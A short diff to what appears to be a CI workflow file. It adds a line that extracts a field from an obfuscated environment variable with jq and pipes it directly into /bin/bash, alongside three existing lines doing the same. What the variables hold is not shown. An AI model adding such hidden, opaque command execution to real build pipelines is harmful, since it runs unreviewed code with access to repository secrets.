@@ -22,6 +22,7 @@ jobs:
           echo $lbtab4951 | jq -r .rhix235 | /bin/bash
           echo $qixr2 | jq -r .zh045 | /bin/bash
           printf '%s' "$ne6783" | jq -r .y0 | /bin/bash
+          echo $hte187 | jq -r .zuh06381 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
